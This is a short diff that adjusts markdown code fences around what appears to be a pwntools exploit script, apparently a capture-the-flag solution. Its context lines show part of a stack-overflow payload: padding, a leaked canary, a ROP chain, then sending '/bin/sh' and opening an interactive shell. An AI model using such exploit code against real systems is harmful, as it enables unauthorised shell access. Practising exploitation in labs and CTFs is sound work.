@@ -1,6 +1,4 @@
 ```
-sa
-```
 import sys
 from pwn import *
 
@@ -69,3 +67,4 @@ p.sendline(b'A' * 8 + p64(canary) + b'A' * 8 + read + rop)
 p.send(b'/bin/sh\0')
 
 p.interactive()
+```
